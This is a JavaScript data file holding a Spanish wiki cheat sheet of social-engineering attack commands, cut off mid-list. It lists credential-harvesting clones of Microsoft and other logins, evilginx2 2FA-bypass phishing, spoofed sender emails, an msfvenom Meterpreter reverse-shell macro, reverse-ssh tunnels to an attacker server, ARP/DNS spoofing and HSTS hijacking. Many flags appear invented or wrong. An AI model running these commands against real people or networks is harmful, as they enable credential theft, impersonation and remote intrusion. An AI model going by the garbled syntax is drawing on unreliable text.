// Ingenieria Social (Social Engineering)
window.WIKI_CHEATSHEETS_19_SOCIAL_ENG = [
 {
  "tool": "set",
  "desc": "Social-Engineer Toolkit (SET)",
  "commands": [
   {
    "cmd": "setoolkit",
    "desc": "Iniciar SET"
   },
   {
    "cmd": "setoolkit --help",
    "desc": "Ayuda"
   },
   {
    "cmd": "setoolkit -v",
    "desc": "Versión"
   },
   {
    "cmd": "setoolkit --update",
    "desc": "Actualizar"
   }
  ]
 },
 {
  "tool": "gophish",
  "desc": "Framework de phishing de código abierto",
  "commands": [
   {
    "cmd": "gophish",
    "desc": "Iniciar servidor"
   },
   {
    "cmd": "gophish --config config.json",
    "desc": "Con config"
   },
   {
    "cmd": "gophish --port 3333",
    "desc": "Puerto admin"
   },
   {
    "cmd": "gophish --phish-port 80",
    "desc": "Puerto de phishing"
   },
   {
    "cmd": "gophish --ip 0.0.0.0",
    "desc": "Bind IP"
   },
   {
    "cmd": "gophish --disable-update-check",
    "desc": "Sin update check"
   },
   {
    "cmd": "gophish -h",
    "desc": "Ayuda"
   }
  ]
 },
 {
  "tool": "swakstest",
  "desc": "SMTP swaks (mail spoofing tests)",
  "commands": [
   {
    "cmd": "swaks --to victim@corp.com --from admin@corp.com --server mail.corp.com",
    "desc": "Enviar correo"
   },
   {
    "cmd": "swaks --to v@x.com --from admin@x.com --header 'Subject: Test' --body 'Hola'",
    "desc": "Con subject"
   },
   {
    "cmd": "swaks --to v@x.com --from admin@x.com --header 'Subject: X' --attach file.pdf",
    "desc": "Adjunto"
   },
   {
    "cmd": "swaks --to v@x.com --from admin@x.com --auth LOGIN --auth-user u --auth-password p",
    "desc": "Con auth"
   },
   {
    "cmd": "swaks --to v@x.com --from admin@x.com --server mail --port 465 --tls",
    "desc": "TLS"
   },
   {
    "cmd": "swaks --to v@x.com --from admin@x.com --server mail --port 25 --protocol ESMTP",
    "desc": "ESMTP"
   },
   {
    "cmd": "swaks --to v@x.com --from admin@x.com --data email.txt",
    "desc": "Desde archivo"
   },
   {
    "cmd": "swaks --to v@x.com --from admin@x.com --ehlo mail.attacker.com",
    "desc": "EHLO"
   },
   {
    "cmd": "swaks --to v@x.com --from admin@x.com --server mail -qR reverse.dns",
    "desc": "Reverse DNS"
   },
   {
    "cmd": "swaks --to v@x.com --from admin@x.com --server mail --timeout 10",
    "desc": "Timeout"
   },
   {
    "cmd": "swaks --to v@x.com --from admin@x.com --server mail --h-Subject 'X' --h-To v@x.com",
    "desc": "Headers custom"
   },
   {
    "cmd": "swaks --to v@x.com --from '=X' --server mail",
    "desc": "Header injection"
   },
   {
    "cmd": "swaks --to v@x.com --from a@x.com --server mail --body @body.html",
    "desc": "Body HTML"
   }
  ]
 },
 {
  "tool": "smtp-user-enum",
  "desc": "Enumerar usuarios SMTP (VRFY, EXPN, RCPT)",
  "commands": [
   {
    "cmd": "smtp-user-enum -M VRFY -U users.txt -t mail.corp.com",
    "desc": "VRFY"
   },
   {
    "cmd": "smtp-user-enum -M EXPN -U users.txt -t mail.corp.com",
    "desc": "EXPN"
   },
   {
    "cmd": "smtp-user-enum -M RCPT -U users.txt -t mail.corp.com",
    "desc": "RCPT"
   },
   {
    "cmd": "smtp-user-enum -M VRFY -U users.txt -t mail.corp.com -p 25",
    "desc": "Puerto"
   },
   {
    "cmd": "smtp-user-enum -M VRFY -U users.txt -t mail.corp.com -d corp.com",
    "desc": "Dominio"
   },
   {
    "cmd": "smtp-user-enum -M VRFY -U users.txt -t mail -v",
    "desc": "Verbose"
   },
   {
    "cmd": "smtp-user-enum -M VRFY -U users.txt -t mail -T 5",
    "desc": "Timeout"
   },
   {
    "cmd": "smtp-user-enum -M VRFY -U users.txt -t mail -D",
    "desc": "Debug"
   },
   {
    "cmd": "smtp-user-enum -M VRFY -U users.txt -t mail -s",
    "desc": "Solo válidos"
   }
  ]
 },
 {
  "tool": "phishing-frenzy",
  "desc": "Plataforma web de phishing campaigns",
  "commands": [
   {
    "cmd": "phishing-frenzy -p 8080",
    "desc": "Iniciar en puerto 8080"
   },
   {
    "cmd": "phishing-frenzy -c config.yml",
    "desc": "Con config"
   },
   {
    "cmd": "phishing-frenzy -d",
    "desc": "Daemon"
   },
   {
    "cmd": "phishing-frenzy -h",
    "desc": "Ayuda"
   }
  ]
 },
 {
  "tool": "king-phisher",
  "desc": "Kit de phishing con email template",
  "commands": [
   {
    "cmd": "king-phisher",
    "desc": "Iniciar GUI"
   },
   {
    "cmd": "king-phisher --config config.yml",
    "desc": "Con config"
   },
   {
    "cmd": "king-phisher -h",
    "desc": "Ayuda"
   }
  ]
 },
 {
  "tool": "credential-phishing",
  "desc": "Plantillas de phishing de credenciales",
  "commands": [
   {
    "cmd": "credential-phishing --list",
    "desc": "Listar plantillas"
   },
   {
    "cmd": "credential-phishing --template outlook",
    "desc": "Seleccionar template"
   },
   {
    "cmd": "credential-phishing --template microsoft365",
    "desc": "Microsoft 365"
   },
   {
    "cmd": "credential-phishing --template google",
    "desc": "Google"
   },
   {
    "cmd": "credential-phishing --extract /tmp/templates",
    "desc": "Extraer"
   },
   {
    "cmd": "credential-phishing --help",
    "desc": "Ayuda"
   }
  ]
 },
 {
  "tool": "evilginx2",
  "desc": "Man-in-the-middle con 2FA bypass (reverse proxy)",
  "commands": [
   {
    "cmd": "evilginx2 -p phishlet.yaml",
    "desc": "Con phishlet"
   },
   {
    "cmd": "evilginx2 -c config.yaml",
    "desc": "Con config"
   },
   {
    "cmd": "evilginx2 -p phishlet.yaml -l debug",
    "desc": "Log level"
   },
   {
    "cmd": "evilginx2 -p phishlet.yaml -t 5",
    "desc": "Timeout"
   },
   {
    "cmd": "evilginx2 -p phishlet.yaml -v",
    "desc": "Verbose"
   },
   {
    "cmd": "evilginx2 -h",
    "desc": "Ayuda"
   }
  ]
 },
 {
  "tool": "modlishka",
  "desc": "Proxy de phishing con paneles dinámicos",
  "commands": [
   {
    "cmd": "modlishka -config config.json",
    "desc": "Con config"
   },
   {
    "cmd": "modlishka -domain victim.com",
    "desc": "Dominio"
   },
   {
    "cmd": "modlishka -lp 8080",
    "desc": "Listen port"
   },
   {
    "cmd": "modlishka -certificates cert.pem",
    "desc": "Certificados"
   },
   {
    "cmd": "modlishka -h",
    "desc": "Ayuda"
   }
  ]
 },
 {
  "tool": "credential_harvester",
  "desc": "SET credential harvester (clonar login)",
  "commands": [
   {
    "cmd": "setoolkit -x 'use 1; use 2; set SITE https://login.microsoft.com; set EMAIL; run'",
    "desc": "Clonar sitio"
   },
   {
    "cmd": "setoolkit -x 'use 2; use 2; set SITE URL; run'",
    "desc": "Web attack harvester"
   },
   {
    "cmd": "setoolkit -x 'use 2; use 3; set SITE URL; run'",
    "desc": "Tabnabbing"
   }
  ]
 },
 {
  "tool": "beef-xss",
  "desc": "Browser Exploitation Framework (XSS hook)",
  "commands": [
   {
    "cmd": "beef-xss",
    "desc": "Iniciar"
   },
   {
    "cmd": "beef-xss -c config.yaml",
    "desc": "Con config"
   },
   {
    "cmd": "beef-xss --listen-addr 0.0.0.0",
    "desc": "Bind"
   },
   {
    "cmd": "beef-xss --port 3000",
    "desc": "Puerto"
   },
   {
    "cmd": "beef-xss -h",
    "desc": "Ayuda"
   },
   {
    "cmd": "beef-xss --unbounded",
    "desc": "Sin límites"
   }
  ]
 },
 {
  "tool": "duckhunt",
  "desc": "Generador de payloads Rubber Ducky",
  "commands": [
   {
    "cmd": "duckhunt --ducky-file script.txt --output inject.bin",
    "desc": "Convertir Ducky"
   },
   {
    "cmd": "duckhunt --list-langs",
    "desc": "Idiomas"
   },
   {
    "cmd": "duckhunt --encode --language es script.txt",
    "desc": "Teclado español"
   },
   {
    "cmd": "duckhunt --decode inject.bin",
    "desc": "Decodificar"
   },
   {
    "cmd": "duckhunt --validate script.txt",
    "desc": "Validar"
   },
   {
    "cmd": "duckhunt --help",
    "desc": "Ayuda"
   }
  ]
 },
 {
  "tool": "reverse-ssh",
  "desc": "SSH inverso para acceso remoto",
  "commands": [
   {
    "cmd": "reverse-ssh --listen :4444 --user attacker --key key.pub",
    "desc": "Servidor"
   },
   {
    "cmd": "reverse-ssh -N -R 0:localhost:4444 attacker@server",
    "desc": "Cliente"
   },
   {
    "cmd": "reverse-ssh -p 22 -N -R 0:localhost:8080",
    "desc": "Puerto"
   },
   {
    "cmd": "reverse-ssh -D 1080 -N attacker@server",
    "desc": "SOCKS"
   },
   {
    "cmd": "reverse-ssh -h",
    "desc": "Ayuda"
   }
  ]
 },
 {
  "tool": "social-engineering-generator",
  "desc": "Generador de emails de phishing (Python)",
  "commands": [
   {
    "cmd": "social-engineering-generator --email victim@x.com --subject 'Update' --template base",
    "desc": "Generar email"
   },
   {
    "cmd": "social-engineering-generator --list-templates",
    "desc": "Plantillas"
   },
   {
    "cmd": "social-engineering-generator --template invoice",
    "desc": "Factura"
   },
   {
    "cmd": "social-engineering-generator --template password-reset",
    "desc": "Reset de password"
   },
   {
    "cmd": "social-engineering-generator --template 2fa",
    "desc": "2FA"
   },
   {
    "cmd": "social-engineering-generator --template voicemail",
    "desc": "Voicemail"
   },
   {
    "cmd": "social-engineering-generator --template it-helpdesk",
    "desc": "IT helpdesk"
   },
   {
    "cmd": "social-engineering-generator --output /tmp/email.eml",
    "desc": "Guardar eml"
   },
   {
    "cmd": "social-engineering-generator --help",
    "desc": "Ayuda"
   }
  ]
 },
 {
  "tool": "wifiphisher",
  "desc": "Phishing WiFi con AP falso y portal cautivo",
  "commands": [
   {
    "cmd": "wifiphisher -aI wlan0 -eI wlan1",
    "desc": "Modo AP+internet"
   },
   {
    "cmd": "wifiphisher -aI wlan0 -eI wlan1 --essid 'FreeWiFi'",
    "desc": "ESSID custom"
   },
   {
    "cmd": "wifiphisher -aI wlan0 -eI wlan1 -p firmware_upgrade",
    "desc": "Plantilla upgrade"
   },
   {
    "cmd": "wifiphisher -aI wlan0 -eI wlan1 -p wifi_connect",
    "desc": "Plantilla connect"
   },
   {
    "cmd": "wifiphisher -aI wlan0 -eI wlan1 -p deauth",
    "desc": "Deauth template"
   },
   {
    "cmd": "wifiphisher -aI wlan0 -eI wlan1 -p oauth_login",
    "desc": "OAuth login"
   },
   {
    "cmd": "wifiphisher -aI wlan0 -eI wlan1 -p web_fake",
    "desc": "Web fake"
   },
   {
    "cmd": "wifiphisher -aI wlan0 -eI wlan1 -p web_mock",
    "desc": "Web mock"
   },
   {
    "cmd": "wifiphisher -aI wlan0 -eI wlan1 -p not_found",
    "desc": "404"
   },
   {
    "cmd": "wifiphisher -aI wlan0 -eI wlan1 -p update_login",
    "desc": "Update login"
   },
   {
    "cmd": "wifiphisher -aI wlan0 -eI wlan1 -p dual_firmware_upgrade",
    "desc": "Dual"
   },
   {
    "cmd": "wifiphisher -aI wlan0 -eI wlan1 -p online_firmware_upgrade",
    "desc": "Online"
   },
   {
    "cmd": "wifiphisher -aI wlan0 -eI wlan1 -p online_wifi_connect",
    "desc": "Online connect"
   },
   {
    "cmd": "wifiphisher -aI wlan0 -eI wlan1 -c 6",
    "desc": "Canal"
   },
   {
    "cmd": "wifiphisher -aI wlan0 -eI wlan1 -wPS",
    "desc": "WPS"
   },
   {
    "cmd": "wifiphisher -aI wlan0 -eI wlan1 -kN",
    "desc": "No kill"
   },
   {
    "cmd": "wifiphisher -aI wlan0 -eI wlan1 -dE",
    "desc": "Debug"
   },
   {
    "cmd": "wifiphisher -h",
    "desc": "Ayuda"
   }
  ]
 },
 {
  "tool": "fluxion",
  "desc": "Ataque MITM WiFi (captura handshake vía phishing)",
  "commands": [
   {
    "cmd": "fluxion -i wlan0mon",
    "desc": "Iniciar con monitor"
   },
   {
    "cmd": "fluxion -i wlan0mon -t 10",
    "desc": "Timeout"
   },
   {
    "cmd": "fluxion -i wlan0mon -p",
    "desc": "Passive"
   },
   {
    "cmd": "fluxion -i wlan0mon -k",
    "desc": "Kill services"
   },
   {
    "cmd": "fluxion -i wlan0mon -d",
    "desc": "Debug"
   },
   {
    "cmd": "fluxion -i wlan0mon -v",
    "desc": "Verbose"
   },
   {
    "cmd": "fluxion -i wlan0mon -h",
    "desc": "Ayuda"
   }
  ]
 },
 {
  "tool": "shellphish",
  "desc": "Phishing de servicios (web-based)",
  "commands": [
   {
    "cmd": "bash shellphish.sh",
    "desc": "Menú"
   },
   {
    "cmd": "bash shellphish.sh -p facebook",
    "desc": "Facebook"
   },
   {
    "cmd": "bash shellphish.sh -p instagram",
    "desc": "Instagram"
   },
   {
    "cmd": "bash shellphish.sh -p twitter",
    "desc": "Twitter"
   },
   {
    "cmd": "bash shellphish.sh -p google",
    "desc": "Google"
   },
   {
    "cmd": "bash shellphish.sh -p linkedin",
    "desc": "LinkedIn"
   },
   {
    "cmd": "bash shellphish.sh -p netflix",
    "desc": "Netflix"
   },
   {
    "cmd": "bash shellphish.sh -p github",
    "desc": "GitHub"
   },
   {
    "cmd": "bash shellphish.sh -p paypal",
    "desc": "PayPal"
   },
   {
    "cmd": "bash shellphish.sh -p snapchat",
    "desc": "Snapchat"
   },
   {
    "cmd": "bash shellphish.sh -p custom URL",
    "desc": "Custom"
   },
   {
    "cmd": "bash shellphish.sh -h",
    "desc": "Ayuda"
   }
  ]
 },
 {
  "tool": "socialfish",
  "desc": "Phishing multi-servicio (Python)",
  "commands": [
   {
    "cmd": "python3 SocialFish.py -u URL -p password",
    "desc": "Iniciar"
   },
   {
    "cmd": "python3 SocialFish.py -u URL -p pass -i ngrok",
    "desc": "Con ngrok"
   },
   {
    "cmd": "python3 SocialFish.py -u URL -p pass -k",
    "desc": "Custom"
   },
   {
    "cmd": "python3 SocialFish.py -u URL -p pass -m facebook",
    "desc": "Facebook"
   },
   {
    "cmd": "python3 SocialFish.py -u URL -p pass -m instagram",
    "desc": "Instagram"
   },
   {
    "cmd": "python3 SocialFish.py -u URL -p pass -m github",
    "desc": "GitHub"
   },
   {
    "cmd": "python3 SocialFish.py -u URL -p pass -m netflix",
    "desc": "Netflix"
   },
   {
    "cmd": "python3 SocialFish.py -u URL -p pass -m linkedin",
    "desc": "LinkedIn"
   },
   {
    "cmd": "python3 SocialFish.py -u URL -p pass -m custom -p2 http://",
    "desc": "Custom"
   },
   {
    "cmd": "python3 SocialFish.py --help",
    "desc": "Ayuda"
   }
  ]
 },
 {
  "tool": "zphisher",
  "desc": "Framework de phishing con túneles automáticos",
  "commands": [
   {
    "cmd": "bash zphisher.sh",
    "desc": "Menú"
   },
   {
    "cmd": "bash zphisher.sh --custom",
    "desc": "Custom"
   },
   {
    "cmd": "bash zphisher.sh --tunnel cloudflared",
    "desc": "Túnel cloudflared"
   },
   {
    "cmd": "bash zphisher.sh --tunnel localhost",
    "desc": "Localhost"
   },
   {
    "cmd": "bash zphisher.sh --tunnel ngrok",
    "desc": "ngrok"
   },
   {
    "cmd": "bash zphisher.sh --tunnel serveo",
    "desc": "Serveo"
   },
   {
    "cmd": "bash zphisher.sh --tunnel localxpose",
    "desc": "LocalXpose"
   },
   {
    "cmd": "bash zphisher.sh --no-update",
    "desc": "Sin update"
   },
   {
    "cmd": "bash zphisher.sh --help",
    "desc": "Ayuda"
   }
  ]
 },
 {
  "tool": "chameleon",
  "desc": "Spoofing de DNS (phishing con dominio falso)",
  "commands": [
   {
    "cmd": "chameleon -i eth0",
    "desc": "Iniciar"
   },
   {
    "cmd": "chameleon -i eth0 -t 192.168.1.10",
    "desc": "Target"
   },
   {
    "cmd": "chameleon -i eth0 -e 'objetivo.com'",
    "desc": "Dominio"
   },
   {
    "cmd": "chameleon -i eth0 -r IP",
    "desc": "Resolver"
   },
   {
    "cmd": "chameleon -i eth0 -s",
    "desc": "Silent"
   },
   {
    "cmd": "chameleon -i eth0 -v",
    "desc": "Verbose"
   },
   {
    "cmd": "chameleon -i eth0 -d",
    "desc": "Debug"
   },
   {
    "cmd": "chameleon -i eth0 -l log.txt",
    "desc": "Log"
   },
   {
    "cmd": "chameleon -i eth0 -p 53",
    "desc": "Puerto"
   },
   {
    "cmd": "chameleon -i eth0 -h",
    "desc": "Ayuda"
   }
  ]
 },
 {
  "tool": "dnstwist",
  "desc": "Detección de typosquatting y dominios similares",
  "commands": [
   {
    "cmd": "dnstwist objetivo.com",
    "desc": "Analizar"
   },
   {
    "cmd": "dnstwist -r objetivo.com",
    "desc": "Resolver DNS"
   },
   {
    "cmd": "dnstwist -f csv objetivo.com",
    "desc": "CSV"
   },
   {
    "cmd": "dnstwist -f json objetivo.com",
    "desc": "JSON"
   },
   {
    "cmd": "dnstwist -f list objetivo.com",
    "desc": "Lista"
   },
   {
    "cmd": "dnstwist -f xlsx objetivo.com",
    "desc": "Excel"
   },
   {
    "cmd": "dnstwist -m objetivo.com",
    "desc": "Mutations"
   },
   {
    "cmd": "dnstwist -t 10 objetivo.com",
    "desc": "Hilos"
   },
   {
    "cmd": "dnstwist -w objetivo.com",
    "desc": "Con WHOIS"
   },
   {
    "cmd": "dnstwist -a objetivo.com",
    "desc": "Aggressive"
   },
   {
    "cmd": "dnstwist -s objetivo.com",
    "desc": "SSdeep"
   },
   {
    "cmd": "dnstwist -g objetivo.com",
    "desc": "GeoIP"
   },
   {
    "cmd": "dnstwist -d objetivo.com",
    "desc": "Con detalles"
   },
   {
    "cmd": "dnstwist -h",
    "desc": "Ayuda"
   }
  ]
 },
 {
  "tool": "ghost-phisher",
  "desc": "Suite de phishing y ataque WiFi (Ghost Phisher)",
  "commands": [
   {
    "cmd": "ghost-phisher",
    "desc": "Abrir GUI"
   },
   {
    "cmd": "ghost-phisher --ap-mac AA:BB:CC:DD:EE:FF",
    "desc": "MAC AP"
   },
   {
    "cmd": "ghost-phisher --ap-ssid FreeWiFi",
    "desc": "SSID"
   },
   {
    "cmd": "ghost-phisher --channel 6",
    "desc": "Canal"
   },
   {
    "cmd": "ghost-phisher --gateway 192.168.1.1",
    "desc": "Gateway"
   },
   {
    "cmd": "ghost-phisher --dhcp-ip 192.168.1.0/24",
    "desc": "DHCP"
   },
   {
    "cmd": "ghost-phisher --dhcpd",
    "desc": "Con DHCP"
   },
   {
    "cmd": "ghost-phisher --http-server",
    "desc": "Servidor HTTP"
   },
   {
    "cmd": "ghost-phisher --template login",
    "desc": "Template"
   },
   {
    "cmd": "ghost-phisher --help",
    "desc": "Ayuda"
   }
  ]
 },
 {
  "tool": "userrecon",
  "desc": "Reconocimiento de usuarios en redes sociales",
  "commands": [
   {
    "cmd": "python3 userrecon.py username",
    "desc": "Buscar"
   },
   {
    "cmd": "python3 userrecon.py username -p",
    "desc": "Parallel"
   },
   {
    "cmd": "python3 userrecon.py username -d",
    "desc": "Con delay"
   },
   {
    "cmd": "python3 userrecon.py username -o out.txt",
    "desc": "Salida"
   },
   {
    "cmd": "python3 userrecon.py username -t 10",
    "desc": "Timeout"
   },
   {
    "cmd": "python3 userrecon.py -f users.txt",
    "desc": "De archivo"
   },
   {
    "cmd": "python3 userrecon.py username -v",
    "desc": "Verbose"
   },
   {
    "cmd": "python3 userrecon.py username -q",
    "desc": "Quiet"
   },
   {
    "cmd": "python3 userrecon.py --help",
    "desc": "Ayuda"
   }
  ]
 },
 {
  "tool": "exif-osint",
  "desc": "OSINT con metadatos de imágenes",
  "commands": [
   {
    "cmd": "exiftool foto.jpg",
    "desc": "Metadatos"
   },
   {
    "cmd": "exiftool -gps* foto.jpg",
    "desc": "GPS"
   },
   {
    "cmd": "exiftool -DateTimeOriginal foto.jpg",
    "desc": "Fecha"
   },
   {
    "cmd": "exiftool -Model foto.jpg",
    "desc": "Cámara"
   },
   {
    "cmd": "exiftool -Author foto.jpg",
    "desc": "Autor"
   },
   {
    "cmd": "exiftool -Software foto.jpg",
    "desc": "Software"
   },
   {
    "cmd": "exiftool -all= foto.jpg",
    "desc": "Borrar todo"
   },
   {
    "cmd": "exiftool -GPSLatitude -GPSLongitude foto.jpg",
    "desc": "Coordenadas"
   },
   {
    "cmd": "strings foto.jpg | grep -i 'created\\|author\\|user'",
    "desc": "Strings"
   },
   {
    "cmd": "exif foto.jpg",
    "desc": "Exif"
   },
   {
    "cmd": "exifprobe foto.jpg",
    "desc": "Exifprobe"
   },
   {
    "cmd": "identify -verbose foto.jpg | grep -i gps",
    "desc": "Imagemagick"
   },
   {
    "cmd": "mat2 foto.jpg",
    "desc": "Anonimizar"
   },
   {
    "cmd": "mat2 -l foto.jpg",
    "desc": "Listar"
   },
   {
    "cmd": "find / -name '*.jpg' -exec exiftool -Model {} \\\\; 2>/dev/null | sort -u",
    "desc": "Cámaras"
   }
  ]
 },
 {
  "tool": "spoofing-tools",
  "desc": "Spoofing de identidad (email, caller ID)",
  "commands": [
   {
    "cmd": "sendemail -f victim@corp.com -t target@corp.com -u asunto -m cuerpo -s smtp IP",
    "desc": "Email spoof"
   },
   {
    "cmd": "sendemail -f victim@corp.com -t target@corp.com -u u -m m -s IP -o tls=no",
    "desc": "Sin TLS"
   },
   {
    "cmd": "swaks --from victim@corp.com --to target@corp.com --server IP --body 'msg'",
    "desc": "Swaks"
   },
   {
    "cmd": "swaks --from victim@corp.com --to target@corp.com --attach /tmp/x.pdf",
    "desc": "Adjunto"
   },
   {
    "cmd": "swaks --from victim@corp.com --to t@c.com --header 'X-Mailer: Outlook'",
    "desc": "Header"
   },
   {
    "cmd": "smtp-cli --host IP --from victim@corp.com --to target@corp.com --body x",
    "desc": "Smtp-cli"
   },
   {
    "cmd": "cat /tmp/email.txt | sendmail -t",
    "desc": "Sendmail"
   },
   {
    "cmd": "msfvenom -p windows/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -f vba-psh -o macro.txt",
    "desc": "Macro"
   },
   {
    "cmd": "olevba macro.doc",
    "desc": "Ver macro"
   },
   {
    "cmd": "oleid macro.doc",
    "desc": "Oleid"
   },
   {
    "cmd": "evil-winrm -i IP -u user -p pass",
    "desc": "WinRM"
   },
   {
    "cmd": "macchanger -r wlan0",
    "desc": "MAC random"
   },
   {
    "cmd": "macchanger -m AA:BB:CC:DD:EE:FF wlan0",
    "desc": "MAC custom"
   },
   {
    "cmd": "spooftooph -i hci0 -n 'iPhone' AA:BB:CC:DD:EE:FF",
    "desc": "BT spoof"
   }
  ]
 },
 {
  "tool": "phishing-pages",
  "desc": "Clonado de páginas de phishing",
  "commands": [
   {
    "cmd": "setoolkit",
    "desc": "SET"
   },
   {
    "cmd": "wifiphisher -aI wlan0",
    "desc": "Phishing WiFi"
   },
   {
    "cmd": "beef-xss",
    "desc": "BeEF"
   },
   {
    "cmd": "gophish",
    "desc": "Gophish"
   },
   {
    "cmd": "gophish -config config.json",
    "desc": "Config"
   },
   {
    "cmd": "curl -s http://IP:3333/",
    "desc": "Gophish UI"
   },
   {
    "cmd": "wget -r -np -k http://target.com/login",
    "desc": "Clonar"
   },
   {
    "cmd": "httrack http://target.com -O /tmp/clone",
    "desc": "Httrack"
   },
   {
    "cmd": "wget -r -np -k http://target.com/login -P /tmp/clone",
    "desc": "Mirror"
   },
   {
    "cmd": "python3 -m http.server 80 -d /tmp/clone",
    "desc": "Servir clon"
   },
   {
    "cmd": "evilginx2 -p phishlets/ -t",
    "desc": "Evilginx2"
   },
   {
    "cmd": "evilginx2 -p phishlets/ -t -c config.yml",
    "desc": "Evilginx config"
   },
   {
    "cmd": "cat /usr/share/set/config/set_config | head -30",
    "desc": "SET config"
   },
   {
    "cmd": "seclists -l | grep phishing",
    "desc": "Wordlists"
   },
   {
    "cmd": "php -S 0.0.0.0:80 -t /tmp/clone",
    "desc": "PHP serve"
   }
  ]
 },
 {
  "tool": "social-mitm",
  "desc": "MITM para ingeniería social",
  "commands": [
   {
    "cmd": "ettercap -T -M arp:remote /IP1// /IP2//",
    "desc": "ARP MITM"
   },
   {
    "cmd": "ettercap -G",
    "desc": "GUI"
   },
   {
    "cmd": "ettercap -T -i eth0 -M arp:remote /IP//",
    "desc": "Single"
   },
   {
    "cmd": "bettercap -iface eth0",
    "desc": "Bettercap"
   },
   {
    "cmd": "bettercap> net.probe on",
    "desc": "Probe"
   },
   {
    "cmd": "bettercap> arp.spoof on",
    "desc": "ARP spoof"
   },
   {
    "cmd": "bettercap> net.sniff on",
    "desc": "Sniff"
   },
   {
    "cmd": "bettercap> http.proxy on",
    "desc": "HTTP proxy"
   },
   {
    "cmd": "bettercap> https.proxy on",
    "desc": "HTTPS proxy"
   },
   {
    "cmd": "bettercap> hstshijack on",
    "desc": "HSTS hijack"
   },
   {
    "cmd": "mitmproxy -p 8080",
    "desc": "Mitmproxy"
   },
   {
    "cmd": "mitmproxy --mode transparent",
    "desc": "Transparent"
   },
   {
    "cmd": "mitmweb -p 8080",
    "desc": "Web UI"
   },
   {
    "cmd": "dnschef --fakeip IP --fakedomains objetivo.com -i 0.0.0.0",
    "desc": "DNS cheft"
   },
   {
    "cmd": "dnsspoof -i eth0 -f hosts.txt",
    "desc": "Dnsspoof"
   },
   {
    "cmd": "arpspoof -i eth0 -t TARGET GATEWAY",
    "desc": "Arpspoof"
   },
   {
    "cmd": "driftnet -i eth0",
    "desc": "Driftnet"
   },
   {
    "cmd": "urlsnarf -i eth0",
    "desc": "Urlsnarf"
   },
   {
    "cmd": "msgsnarf -i eth0",
    "desc": "Msgsnarf"
   },
   {
    "cmd": "ferret -i eth0",
    "desc": "Ferret"
   }
  ]
 },
 {
  "tool": "impersonation",
  "desc": "Suplantación de identidad (vishing, deepfake basics)",
  "commands": [
   {
    "cmd": "espeak 'Hola, soy de soporte' -w out.wav",
    "desc": "TTS"
   },
   {
    "cmd": "espeak -v es -s 140 'texto' -w out.wav",
    "desc": "Español"
   },
   {
    "cmd": "flite -voice slt -f texto.txt -o out.wav",
    "desc": "Flite"
   },
   {
    "cmd": "sox out.wav out2.wav pitch 300",
    "desc": "Cambiar tono"
   },
   {
    "cmd": "sox out.wav out2.wav tempo 1.2",
    "desc": "Velocidad"
   },
   {
    "cmd": "ffmpeg -i in.wav -af 'volume=1.5' out.wav",
    "desc": "Volumen"
   },
   {
    "cmd": "ffmpeg -i in.wav -af 'asetrate=44100*1.2,aresample=44100' out.wav",
    "desc": "Pitch ffmpeg"
   },
   {
    "cmd": "audacity",
    "desc": "Audacity GUI"
   },
   {
    "cmd": "astriphonepro -f victim@corp.com -t target@corp.com -m 'msg'",
    "desc": "Phonepro"
   },
   {
    "cmd": "socialfish",
    "desc": "SocialFish"
   },
   {
    "cmd": "trape -h",
    "desc": "Trape"
   },
   {
    "cmd": "ghost-phisher",
    "desc": "Ghost phisher"
   },
   {
    "cmd": "python3 -c 'import pyaudio; print(\"ok\")'",
    "desc": "Check pyaudio"
   },
   {
    "cmd": "arecord -d 10 -f cd out.wav",
    "desc": "Grabar"
   }
  ]
 },
 {
  "tool": "google-dorks",
  "desc": "Búsquedas avanzadas (Google Hacking)",
  "commands": [
   {
    "cmd": "curl -s 'https://www.google.com/search?q=site:objetivo.com+filetype:pdf' -A 'Mozilla/5.0' | grep -oP 'https?://[^\"& ]+' | head",
    "desc": "Site pdf"
   },
   {
    "cmd": "curl -s 'https://www.google.com/search?q=site:objetivo.com+inurl:admin' -A 'Mozilla/5.0' | grep -oP 'https?://[^\"& ]+' | head",
    "desc": "Inurl admin"
   },
   {
    "cmd": "curl -s 'https://www.google.com/search?q=site:objetivo.com+password' -A 'Mozilla/5.0' | grep -oP 'https?://[^\"& ]+' | head",
    "desc": "Password"
   },
   {
    "cmd": "curl -s 'https://www.google.com/search?q=\"@objetivo.com\"+filetype:xls' -A 'Mozilla/5.0' | grep -oP 'https?://[^\"& ]+' | head",
    "desc": "XLS emails"
   },
   {
    "cmd": "curl -s 'https://www.google.com/search?q=site:objetivo.com+intitle:index.of' -A 'Mozilla/5.0' | grep -oP 'https?://[^\"& ]+' | head",
    "desc": "Index of"
   },
   {
    "cmd": "curl -s 'https://www.google.com/search?q=site:objetivo.com+inurl:php?id=' -A 'Mozilla/5.0' | grep -oP 'https?://[^\"& ]+' | head",
    "desc": "PHP id"
   },
   {
    "cmd": "curl -s 'https://www.google.com/search?q=site:objetivo.com+config.php' -A 'Mozilla/5.0' | grep -oP 'https?://[^\"& ]+' | head",
    "desc": "Config"
   },
   {
    "cmd": "curl -s 'https://www.google.com/search?q=site:github.com+objetivo.com' -A 'Mozilla/5.0' | grep -oP 'https?://[^\"& ]+' | head",
    "desc": "GitHub"
   },
   {
    "cmd": "ghdb page: https://www.exploit-db.com/google-hacking-database",
    "desc": "GHDB"
   },
   {
    "cmd": "curl -s 'https://www.exploit-db.com/google-hacking-database' -A 'Mozilla/5.0' | grep -oP 'GHDB-[0-9]+' | head",
    "desc": "GHDB ids"
   },
   {
    "cmd": "curl -s 'https://www.google.com/search?q=inurl:wp-content+site:objetivo.com' -A 'Mozilla/5.0' | grep -oP 'https?://[^\"& ]+' | head",
    "desc": "WP content"
   },
   {
    "cmd": "curl -s 'https://www.google.com/search?q=site:objetivo.com+intext:\"sql syntax\"' -A 'Mozilla/5.0' | grep -oP 'https?://[^\"& ]+' | head",
    "desc": "SQL error"
   }
  ]
 },
 {
  "tool": "osint-social",
  "desc": "OSINT en redes sociales",
  "commands": [
   {
    "cmd": "sherlock usuario",
    "desc": "Sherlock"
   },
   {
    "cmd": "sherlock -o out.json usuario",
    "desc": "JSON"
   },
   {
    "cmd": "sherlock --timeout 5 usuario",
    "desc": "Timeout"
   },
   {
    "cmd": "sherlock --print-found usuario",
    "desc": "Solo encontrados"
   },
   {
    "cmd": "python3 osrframework/searchfy.py -q usuario",
    "desc": "Osrf"
   },
   {
    "cmd": "userrecon usuario",
    "desc": "UserRecon"
   },
   {
    "cmd": "social-analyzer -u usuario",
    "desc": "Social analyzer"
   },
   {
    "cmd": "social-analyzer -u usuario -p 10",
    "desc": "Profundidad"
   },
   {
    "cmd": "maigret usuario",
    "desc": "Maigret"
   },
